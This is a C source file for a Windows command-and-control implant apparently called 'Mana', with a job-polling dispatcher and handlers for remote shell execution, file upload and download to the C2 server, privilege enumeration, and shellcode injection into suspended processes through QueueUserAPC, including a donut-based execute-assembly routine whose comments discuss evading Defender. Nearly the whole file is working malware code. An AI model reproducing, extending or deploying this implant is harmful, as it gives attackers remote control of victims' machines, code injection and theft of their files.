#include <Mana.h>

#include <Command.h>
#include <Package.h>
#include <Core.h>
#include <Apihashing.h>

#define Mana_COMMAND_LENGTH 11

Mana_COMMAND Commands[ Mana_COMMAND_LENGTH ] = {
        { .ID = COMMAND_SHELL,            .Function = CommandShell },
        { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
        { .ID = COMMAND_UPLOAD,           .Function = CommandUpload },
        { .ID = COMMAND_EXIT,             .Function = CommandExit },
        { .ID = COMMAND_WHOAMI,           .Function = CommandWhoami },
        { .ID = COMMAND_PWD,              .Function = CommandPwd },
        { .ID = COMMAND_CD,               .Function = CommandCd },
        { .ID = COMMAND_LS,               .Function = CommandLs },
        { .ID = COMMAND_EBAPC,            .Function = CommandEbapc },
        { .ID = COMMAND_EXECUTE_ASSEMBLY, .Function = CommandExecuteAssembly },
};

VOID CommandDispatcher()
{
    PPACKAGE Package     = NULL;
    PARSER   Parser      = { 0 };
    PVOID    DataBuffer  = NULL;
    SIZE_T   DataSize    = 0;
    DWORD    TaskCommand = 0;

    puts( "Command Dispatcher..." );

    do
    {
        if ( ! Instance.Session.Connected ) {
            puts("Instance Session not connected");
            return;
        }

        Api.Sleep( Instance.Config.Sleeping );

        Package = PackageCreate( COMMAND_GET_JOB );

        PackageAddInt32( Package, Instance.Session.AgentID );
        PackageTransmit( Package, &DataBuffer, &DataSize );

        if ( DataBuffer && DataSize > 0 )
        {
            //PRINT_HEX( DataBuffer, DataSize )

            ParserNew( &Parser, DataBuffer, DataSize );
            do
            {
                TaskCommand = ParserGetInt32( &Parser );

                if ( TaskCommand != COMMAND_NO_JOB )
                {
                    printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );

                    BOOL FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < Mana_COMMAND_LENGTH; FunctionCounter++ )
                    {
                        if ( Commands[ FunctionCounter ].ID == TaskCommand )
                        {
                            Commands[ FunctionCounter ].Function( &Parser );
                            FoundCommand = TRUE;
                            break;
                        }
                    }

                    if ( ! FoundCommand )
                        puts( "Command not found !!" );

                } else puts( "Is COMMAND_NO_JOB" );

            } while ( Parser.Length > 4 );

            memset( DataBuffer, 0, DataSize );
            Api.LocalFree( *( PVOID* ) DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );

        }
        else
        {
            puts( "Transport: Failed" );
            break;
        }

    } while ( TRUE );

    Instance.Session.Connected = FALSE;
}

VOID CommandEbapc( PPARSER Parser )
{
    PPACKAGE Package          = PackageCreate( COMMAND_OUTPUT );
    CHAR     Output[1024]     = { 0 };
    INT      Offset           = 0;
    PVOID    ShellcodeAddress = NULL;
    DWORD    NameSize         = 0;
    DWORD    ShellSize        = 0;
    DWORD    dwOldProtection  = 0;

    // Get process name
    PCHAR Processname = ParserGetBytes( Parser, &NameSize );
    
    // Get shellcode bytes
    PBYTE Shellcode = ParserGetBytes( Parser, &ShellSize );

    // Null terminate process name
    CHAR ProcessPath[MAX_PATH] = { 0 };
    memcpy( ProcessPath, Processname, (NameSize < MAX_PATH - 1) ? NameSize : MAX_PATH - 1 );

    // Trim whitespace
    for ( INT i = strlen(ProcessPath) - 1; i >= 0 && (ProcessPath[i] == ' ' || ProcessPath[i] == '\r' || ProcessPath[i] == '\n'); i-- )
    {
        ProcessPath[i] = '\0';
    }

    
    STARTUPINFOA        Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };
    Si.cb = sizeof(Si);
    
    // Create suspended process
    if ( !Api.CreateProcessA( ProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi ) )
    {
        Offset += sprintf( Output + Offset, "[!] CreateProcessA failed: %d\r\n", Api.GetLastError() );
    }

    Offset += sprintf( Output + Offset, "[+] Created process PID: %d\r\n", Pi.dwProcessId );

    // Allocate memory
    ShellcodeAddress = Api.VirtualAllocEx( Pi.hProcess, NULL, ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !ShellcodeAddress )
    {
        Offset += sprintf( Output + Offset, "[!] VirtualAllocEx failed: %d\r\n", Api.GetLastError() );
        Api.TerminateProcess( Pi.hProcess, 0 );
    }

    // Write shellcode 
    if ( !Api.WriteProcessMemory( Pi.hProcess, ShellcodeAddress, Shellcode, ShellSize, NULL ) )
    {
        Offset += sprintf( Output + Offset, "[!] WriteProcessMemory failed: %d\r\n", Api.GetLastError() );
        Api.TerminateProcess( Pi.hProcess, 0 );
    }

    // Change protection to RX
    if ( !Api.VirtualProtectEx( Pi.hProcess, ShellcodeAddress, ShellSize, PAGE_EXECUTE_READWRITE, &dwOldProtection ) )
    {
        Offset += sprintf( Output + Offset, "[!] VirtualProtectEx failed: %d\r\n", Api.GetLastError() );
        Api.TerminateProcess( Pi.hProcess, 0 );
    }

    // Queue APC
    if ( !Api.QueueUserAPC( (PAPCFUNC)ShellcodeAddress, Pi.hThread, 0 ) )
    {
        Offset += sprintf( Output + Offset, "[!] QueueUserAPC failed: %d\r\n", Api.GetLastError() );
        Api.TerminateProcess( Pi.hProcess, 0 );
    }

    // Resume thread
    Api.ResumeThread( Pi.hThread );
    Offset += sprintf( Output + Offset, "[+] Shellcode injected and executed!\r\n" );

    // Cleanup handles
    Api.CloseHandle( Pi.hProcess );
    Api.CloseHandle( Pi.hThread );

    PackageAddBytes( Package, (PBYTE)Output, Offset );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandLs( PPARSER Parser )
{
    puts( "Command::Ls" );

    PPACKAGE          Package         = PackageCreate( COMMAND_OUTPUT );
    CHAR              Output[16384]   = { 0 };
    INT               Offset          = 0;
    WIN32_FIND_DATAA  FindData        = { 0 };
    HANDLE            hFind           = INVALID_HANDLE_VALUE;
    CHAR              TargetDir[MAX_PATH] = { 0 };
    CHAR              FullPath[MAX_PATH] = { 0 };
    CHAR              SearchPath[MAX_PATH] = { 0 };
    SYSTEMTIME        SysTime         = { 0 };
    FILETIME          LocalTime       = { 0 };
    DWORD             FileCount       = 0;
    DWORD             DirCount        = 0;
    ULONGLONG         TotalSize       = 0;
    UINT32   ArgsLen        = 0;
    PCHAR    Args           = NULL;
    

    // Get arguments from parser
    Args = ParserGetBytes( Parser, &ArgsLen );

    // checks if args is provided by the operator if not it will use the current directory
    if ( ArgsLen > 0 && Args != NULL )
    {
        // Copy path from args
        memcpy( TargetDir, Args, (ArgsLen < MAX_PATH - 1) ? ArgsLen : MAX_PATH - 1 );

        // Trim trailing whitespace/newlines
        for ( INT i = strlen(TargetDir) - 1; i >= 0 && (TargetDir[i] == ' ' || TargetDir[i] == '\r' || TargetDir[i] == '\n'); i-- )
        {
            TargetDir[i] = '\0';
        }

        // If empty after trim, use current directory
        if ( strlen(TargetDir) == 0 )
        {
            Api.GetCurrentDirectoryA( MAX_PATH, TargetDir );
        }
    }
    else
    {
        // No args, use current directory
        Api.GetCurrentDirectoryA( MAX_PATH, TargetDir );
    }


    // Get full path for display for output
    Api.GetFullPathNameA( TargetDir, MAX_PATH, FullPath, NULL );
    
    sprintf( SearchPath, "%s\\*", FullPath );

    // Header for output
    Offset += sprintf( Output + Offset, "\r\n Directory of %s\r\n\r\n", FullPath );
    Offset += sprintf( Output + Offset, "%-12s  %-8s  %-12s  %s\r\n", "Date", "Time", "Size", "Name" );
    Offset += sprintf( Output + Offset, "------------  --------  ------------  ----------------------------------------\r\n" );

    // Find files
    hFind = Api.FindFirstFileA( SearchPath, &FindData );
    
    if ( hFind == INVALID_HANDLE_VALUE )
    {
        Offset += sprintf( Output + Offset, "[!] Failed to list directory (Error: %d)\r\n", GetLastError() );
    }

    do
    {
        // Convert file time to local time
        Api.FileTimeToLocalFileTime( &FindData.ftLastWriteTime, &LocalTime );
        Api.FileTimeToSystemTime( &LocalTime, &SysTime );

        // Format date and time
        CHAR DateStr[16] = { 0 };
        CHAR TimeStr[16] = { 0 };
        sprintf( DateStr, "%02d/%02d/%04d", SysTime.wMonth, SysTime.wDay, SysTime.wYear );
        sprintf( TimeStr, "%02d:%02d %s",
            (SysTime.wHour % 12) ? (SysTime.wHour % 12) : 12,
            SysTime.wMinute,
            (SysTime.wHour >= 12) ? "PM" : "AM" );

        // Format size
        CHAR SizeStr[16] = { 0 };

        // check if the hfile contains an attribute of a folder if yes it will be appended with <DIR>
        if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
        {
            strcpy( SizeStr, "<DIR>" );
            DirCount++;
        }
        else
        {
            // if not a folder it will get the file size and convert it to B,KB,MB and GB
            ULONGLONG FileSize = ((ULONGLONG)FindData.nFileSizeHigh << 32) | FindData.nFileSizeLow;
            TotalSize += FileSize;
            FileCount++;

            if ( FileSize >= 1073741824ULL )
                sprintf( SizeStr, "%.1f GB", (double)FileSize / 1073741824.0 );
            else if ( FileSize >= 1048576ULL )
                sprintf( SizeStr, "%.1f MB", (double)FileSize / 1048576.0 );
            else if ( FileSize >= 1024ULL )
                sprintf( SizeStr, "%.1f KB", (double)FileSize / 1024.0 );
            else
                sprintf( SizeStr, "%llu B", FileSize );
        }

        // Markers for hidden/system
        CHAR Marker[8] = { 0 };
        if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN ) strcat( Marker, "[H]" );
        if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM ) strcat( Marker, "[S]" );

        // Output line
        Offset += sprintf( Output + Offset, "%s  %s  %-12s  %s %s\r\n", DateStr, TimeStr, SizeStr, FindData.cFileName, Marker );


    } while ( Api.FindNextFileA( hFind, &FindData ) );

    Api.FindClose( hFind );

    // Shows the total file count with combined size, then directory count on the target directory
    Offset += sprintf( Output + Offset, "\r\n     %d File(s)  ", FileCount );
    if ( TotalSize >= 1073741824ULL )
        Offset += sprintf( Output + Offset, "%.2f GB\r\n", (double)TotalSize / 1073741824.0 );
    else if ( TotalSize >= 1048576ULL )
        Offset += sprintf( Output + Offset, "%.2f MB\r\n", (double)TotalSize / 1048576.0 );
    else
        Offset += sprintf( Output + Offset, "%llu bytes\r\n", TotalSize );
    Offset += sprintf( Output + Offset, "     %d Dir(s)\r\n", DirCount );

//transfer the data back to c2
PackageAddBytes( Package, (PBYTE)Output, Offset );
PackageTransmit( Package, NULL, NULL );
}

VOID CommandCd( PPARSER Parser )
{
    puts( "Command::Cd" );

    PPACKAGE Package        = PackageCreate( COMMAND_OUTPUT );
    CHAR     Output[1024]   = { 0 };
    INT      Offset         = 0;
    UINT32   ArgsLen        = 0;
    PCHAR    Args           = NULL;
    CHAR     Path[MAX_PATH] = { 0 };
    CHAR     CurrentDir[MAX_PATH] = { 0 };

    // Get arguments
    Args = ParserGetBytes( Parser, &ArgsLen );

    //copy path from args
    memcpy( Path, Args, (ArgsLen < MAX_PATH) ? ArgsLen : MAX_PATH - 1 );

    // Trim trailing whitespace/newlines for cd ..
    for ( INT i = strlen(Path) - 1; i >= 0 && (Path[i] == ' ' || Path[i] == '\r' || Path[i] == '\n'); i-- )
    {
        Path[i] = '\0';
    }

    // Attempt to change directory
    if ( Api.SetCurrentDirectoryA( Path ) )
    {
        // Get and display new current directory
        if ( Api.GetCurrentDirectoryA( MAX_PATH, CurrentDir ) )
        {
            Offset += sprintf( Output + Offset, "[+] Changed to: %s\r\n", CurrentDir );
        }
        else
        {
            Offset += sprintf( Output + Offset, "[+] Directory changed\r\n" );
        }
    }
    else
    {
        DWORD Error = Api.GetLastError();
        
        if ( Error == ERROR_FILE_NOT_FOUND || Error == ERROR_PATH_NOT_FOUND )
        {
            Offset += sprintf( Output + Offset, "[!] Path not found: %s\r\n", Path );
        }
        else if ( Error == ERROR_ACCESS_DENIED )
        {
            Offset += sprintf( Output + Offset, "[!] Access denied: %s\r\n", Path );
        }
        else if ( Error == ERROR_INVALID_NAME )
        {
            Offset += sprintf( Output + Offset, "[!] Invalid path: %s\r\n", Path );
        }
        else
        {
            Offset += sprintf( Output + Offset, "[!] Failed to change directory (Error: %d)\r\n", Error );
        }
    }


PackageAddBytes( Package, (PBYTE)Output, Offset );
PackageTransmit( Package, NULL, NULL );
}

VOID CommandPwd( PPARSER Parser )
{
    puts( "Command::Pwd" );

    PPACKAGE Package         = PackageCreate( COMMAND_OUTPUT );
    CHAR     Output[512]     = { 0 };
    INT      Offset          = 0;
    CHAR     CurrentDir[MAX_PATH] = { 0 };

    if ( Api.GetCurrentDirectoryA( MAX_PATH, CurrentDir ) )
    {
        Offset += sprintf( Output + Offset, "%s\r\n", CurrentDir );
    }
    else
    {
        Offset += sprintf( Output + Offset, "[!] Failed to get current directory\r\n" );
    }

    PackageAddBytes( Package, (PBYTE)Output, Offset );
    PackageTransmit( Package, NULL, NULL );
}

//Situational Awareness

VOID CommandWhoami( PPARSER Parser ){

    PPACKAGE Package  = PackageCreate( COMMAND_OUTPUT );
    char username[256];
    DWORD username_len = sizeof(username);
    HANDLE token = NULL;
    DWORD size = 0;
    PTOKEN_PRIVILEGES privileges = NULL;

    CHAR     Output[4096]    = { 0 };
    INT      Offset          = 0;


    // get current user
    if (Api.GetUserNameA(username, &username_len)) {
        Offset += sprintf( Output + Offset, "[+] Current User: %s\r\n\r\n", username );
    }
    else {
        Offset += sprintf( Output + Offset, "[!] Failed to get username\r\n" );
    } 

    // get privilege information
    if (!Api.OpenProcessToken(Api.GetCurrentProcess(), TOKEN_QUERY, &token))
        return;

    Api.GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
    privileges = (PTOKEN_PRIVILEGES)malloc(size);

    if (!Api.GetTokenInformation(token, TokenPrivileges, privileges, size, &size)) {
        Api.CloseHandle(token);
        free(privileges);
        return;
    }

    // get current privileges
    // Header
    Offset += sprintf( Output + Offset, "%-35s | %-45s | %s\r\n", "Privilege Name", "Description", "Status" );
    Offset += sprintf( Output + Offset, "----------------------------------------------------------------------------------------------------\r\n" );

    for (DWORD i = 0; i < privileges->PrivilegeCount; i++) {
        char privName[128] = { 0 };
        DWORD privNameLen = sizeof(privName);
   

        if (!Api.LookupPrivilegeNameA(NULL, &privileges->Privileges[i].Luid, privName, &privNameLen))
            continue;

        BOOL enabled = (privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED);

        CHAR displayName[256];
        DWORD displayNameSize = sizeof(displayName);
        DWORD languageId = 0;

        BOOL result = Api.LookupPrivilegeDisplayNameA(
            NULL,
            privName,
            displayName,
            &displayNameSize,
            &languageId   
        );
        Offset += sprintf( Output + Offset, "%-35s | %-40s | %s\r\n",
            privName,
            displayName,
            enabled ? "[+] Enabled" : "[-] Disabled"
        );

    }

    Offset += sprintf( Output + Offset, "\r\n[*] Total privileges: %lu\r\n", privileges->PrivilegeCount );

    free(privileges);
    Api.CloseHandle(token);

    PackageAddBytes( Package, (PBYTE)Output, Offset );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandShell( PPARSER Parser )
{
    puts( "Command::Shell" );

    DWORD   Length           = 0;
    PCHAR   Command          = NULL;
    HANDLE  hStdInPipeRead   = NULL;
    HANDLE  hStdInPipeWrite  = NULL;
    HANDLE  hStdOutPipeRead  = NULL;
    HANDLE  hStdOutPipeWrite = NULL;

    PROCESS_INFORMATION ProcessInfo     = { };
    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    STARTUPINFOA        StartUpInfoA    = { };

    Command = ParserGetBytes( Parser, (PUINT32) &Length );

    if ( Api.CreatePipe( &hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
    {
        return;
    }

    if ( Api.CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
    {
        return;
    }

    StartUpInfoA.cb         = sizeof( STARTUPINFOA );
    StartUpInfoA.dwFlags    = STARTF_USESTDHANDLES;
    StartUpInfoA.hStdError  = hStdOutPipeWrite;
    StartUpInfoA.hStdOutput = hStdOutPipeWrite;
    StartUpInfoA.hStdInput  = hStdInPipeRead;

    if ( Api.CreateProcessA( NULL, Command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
    {
        return;
    }

    Api.CloseHandle( hStdOutPipeWrite );
    Api.CloseHandle( hStdInPipeRead );

    AnonPipeRead( hStdOutPipeRead );

    Api.CloseHandle( hStdOutPipeRead );
    Api.CloseHandle( hStdInPipeWrite );
}

VOID CommandUpload( PPARSER Parser )
{
    puts( "Command::Upload" );

    PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
    UINT32   FileSize = 0;
    UINT32   NameSize = 0;
    DWORD    Written  = 0;
    PCHAR    FileName = ParserGetBytes( Parser, &NameSize );
    PVOID    Content  = ParserGetBytes( Parser, &FileSize );
    HANDLE   hFile    = NULL;

    FileName[ NameSize ] = 0;

    printf( "FileName => %s (FileSize: %d)", FileName, FileSize );

    hFile = Api.CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );

    if ( hFile == INVALID_HANDLE_VALUE )
    {
        printf( "[*] CreateFileA: Failed[%ld]\n", Api.GetLastError() );
        goto Cleanup;
    }

    if ( ! Api.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
    {
        printf( "[*] WriteFile: Failed[%ld]\n", Api.GetLastError() );
        goto Cleanup;
    }

    PackageAddInt32( Package, FileSize );
    PackageAddBytes( Package, FileName, NameSize );

    PackageTransmit( Package, NULL, NULL );

Cleanup:
    Api.CloseHandle( hFile );
    hFile = NULL;
}

//have issue downloading a bit large files
VOID CommandDownload( PPARSER Parser )
{
    puts( "Command::Download" );

    PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
    DWORD    FileSize = 0;
    DWORD    Read     = 0;
    DWORD    NameSize = 0;
    PCHAR    FileName = ParserGetBytes( Parser, (PUINT32) &NameSize );
    HANDLE   hFile    = NULL;
    PVOID    Content  = NULL;

    FileName[ NameSize ] = 0;

    printf( "FileName => %s", FileName );

    hFile = Api.CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
    {
        printf( "[*] CreateFileA: Failed[%ld]\n", Api.GetLastError() );
        goto CleanupDownload;
    }

    FileSize = Api.GetFileSize( hFile, 0 );
    Content  = Api.LocalAlloc( LPTR, FileSize );

    if ( ! Api.ReadFile( hFile, Content, FileSize, &Read, NULL ) )
    {
        printf( "[*] ReadFile: Failed[%ld]\n", Api.GetLastError() );
        goto CleanupDownload;
    }

    PackageAddBytes( Package, FileName, NameSize );
    PackageAddBytes( Package, Content,  FileSize );

    PackageTransmit( Package, NULL, NULL );

CleanupDownload:
    if ( hFile )
    {
        Api.CloseHandle( hFile );
        hFile = NULL;
    }

    if ( Content )
    {
        memset( Content, 0, FileSize );
        Api.LocalFree( Content );
        Content = NULL;
    }

}

//execute .net on a remote process by utilizing donut shellcode.
//spawn msiexec by default, edit the agent.py to change the target process
//detected by defender, even with a modified .NET payload that works when executed separately and effectively bypass defender.
// It's probably because of how donut converts the .NET into a shellcode which is why it's detected.
//Just added this as I want to have it a way to execute .NET applications in another application
//A work around might be added in the future. Another development in progress is 
// inlineExecuteAssembly which executes .NET in the same process which this time will not use donut.
VOID CommandExecuteAssembly(PPARSER Parser)
{
    PPACKAGE            Package         = PackageCreate(COMMAND_OUTPUT);
    CHAR                Output[8192]    = { 0 };
    INT                 Offset          = 0;
    DWORD               ShellcodeSize   = 0;
    PBYTE               Shellcode       = NULL;
    DWORD               SpawnSize       = 0;
    PCHAR               SpawnProcess    = NULL;
    CHAR                SpawnPath[MAX_PATH] = { 0 };
    STARTUPINFOA        Si              = { 0 };
    PROCESS_INFORMATION Pi              = { 0 };
    SECURITY_ATTRIBUTES Sa              = { 0 };
    HANDLE              hPipeRead       = NULL;
    HANDLE              hPipeWrite      = NULL;
    LPVOID              pRemote         = NULL;
    DWORD               OldProtect      = 0;
    CHAR                PipeBuffer[65536] = { 0 };
    DWORD               BytesRead       = 0;
    DWORD               TotalRead       = 0;
    DWORD               BytesAvailable  = 0;

    // Parse parameters
    SpawnProcess = (PCHAR)ParserGetBytes(Parser, &SpawnSize);
    Shellcode    = ParserGetBytes(Parser, &ShellcodeSize);

    if (!Shellcode || ShellcodeSize == 0)
    {
        Offset += sprintf(Output + Offset, "[!] No shellcode provided\r\n");
        goto Send;
    }

    // Set spawn process path
    if (SpawnProcess && SpawnSize > 0)
    {
        memcpy(SpawnPath, SpawnProcess, SpawnSize < MAX_PATH - 1 ? SpawnSize : MAX_PATH - 1);
    }
    else
    {
        strcpy(SpawnPath, "C:\\Windows\\System32\\cmd.exe");
    }

    // Create pipe for output capture
    Sa.nLength              = sizeof(SECURITY_ATTRIBUTES);
    Sa.bInheritHandle       = TRUE;
    Sa.lpSecurityDescriptor = NULL;

    if (!Api.CreatePipe(&hPipeRead, &hPipeWrite, &Sa, 0))
    {
        Offset += sprintf(Output + Offset, "[!] CreatePipe failed: %lu\r\n", Api.GetLastError());
        goto Send;
    }

    // Ensure read handle is not inherited
    Api.SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);

    // Setup startup info with redirected stdout/stderr
    Si.cb          = sizeof(STARTUPINFOA);
    Si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    Si.wShowWindow = SW_HIDE;
    Si.hStdOutput  = hPipeWrite;
    Si.hStdError   = hPipeWrite;
    Si.hStdInput   = NULL;

    // Create suspended process with redirected output
    if (!Api.CreateProcessA(
            SpawnPath,
            NULL,
            NULL,
            NULL,
            TRUE,  // Inherit handles = TRUE 
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,
            NULL,
            &Si,
            &Pi))
    {
        Offset += sprintf(Output + Offset, "[!] CreateProcessA failed: %lu\r\n", Api.GetLastError());
        goto Cleanup;
    }

    // Allocate memory in target process
    pRemote = Api.VirtualAllocEx(Pi.hProcess, NULL, ShellcodeSize,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote)
    {
        Offset += sprintf(Output + Offset, "[!] VirtualAllocEx failed: %lu\r\n", Api.GetLastError());
        Api.TerminateProcess(Pi.hProcess, 0);
        goto Cleanup;
    }

    // Write shellcode
    if (!Api.WriteProcessMemory(Pi.hProcess, pRemote, Shellcode, ShellcodeSize, NULL))
    {
        Offset += sprintf(Output + Offset, "[!] WriteProcessMemory failed: %lu\r\n", Api.GetLastError());
        Api.TerminateProcess(Pi.hProcess, 0);
        goto Cleanup;
    }

    // Make executable
    Api.VirtualProtectEx(Pi.hProcess, pRemote, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtect);

    // Queue APC and resume
    Api.QueueUserAPC((PAPCFUNC)pRemote, Pi.hThread, 0);
    Api.ResumeThread(Pi.hThread);

    // Close write end of pipe (so ReadFile will return when process exits)
    Api.CloseHandle(hPipeWrite);
    hPipeWrite = NULL;

    // Wait for process to complete (with timeout)
    Api.WaitForSingleObject(Pi.hProcess, 60000);  // 60 second timeout

    // Read all available output from pipe
    TotalRead = 0;
    while (TRUE)
    {
        // Check if data available
        if (!Api.PeekNamedPipe(hPipeRead, NULL, 0, NULL, &BytesAvailable, NULL))
            break;

        if (BytesAvailable == 0)
            break;

        // Read data
        DWORD ToRead = (BytesAvailable < sizeof(PipeBuffer) - TotalRead - 1) 
                       ? BytesAvailable 
                       : sizeof(PipeBuffer) - TotalRead - 1;

        if (ToRead == 0)
            break;

        if (!Api.ReadFile(hPipeRead, PipeBuffer + TotalRead, ToRead, &BytesRead, NULL))
            break;

        TotalRead += BytesRead;

        if (TotalRead >= sizeof(PipeBuffer) - 1)
            break;
    }

    // Null terminate
    PipeBuffer[TotalRead] = '\0';

    // Add output to response
    if (TotalRead > 0)
    {
        Offset += sprintf(Output + Offset, "[+] Process Name: %s\r\n", SpawnPath);
        Offset += sprintf(Output + Offset, "[+] PID: %lu\r\n", Pi.dwProcessId);
        Offset += sprintf(Output + Offset, "[+] Assembly Output (%lu bytes):\r\n", TotalRead);
        
        // Append pipe output (truncate if needed)
        DWORD CopyLen = TotalRead;
        if (Offset + CopyLen > sizeof(Output) - 100)
        {
            CopyLen = sizeof(Output) - Offset - 100;
        }
        memcpy(Output + Offset, PipeBuffer, CopyLen);
        Offset += CopyLen;
    }
    else
    {
        Offset += sprintf(Output + Offset, "[*] No output captured (assembly may have no console output)\r\n");
    }

Cleanup:
    if (Pi.hProcess)
    {
        Offset += sprintf(Output + Offset, "[!] Terminating spawned process\r\n");
        Api.TerminateProcess(Pi.hProcess, 0);
    }
    if (hPipeRead)   Api.CloseHandle(hPipeRead);
    if (hPipeWrite)  Api.CloseHandle(hPipeWrite);
    if (Pi.hThread)  Api.CloseHandle(Pi.hThread);
    if (Pi.hProcess) Api.CloseHandle(Pi.hProcess);

Send:
    PackageAddBytes(Package, (PBYTE)Output, Offset);
    PackageTransmit(Package, NULL, NULL);
}

VOID CommandExit( PPARSER Parser )
{

    PPACKAGE Package  = PackageCreate( COMMAND_EXIT );
    
    PackageTransmit( Package, NULL, NULL );

    Api.ExitProcess( 0 );
}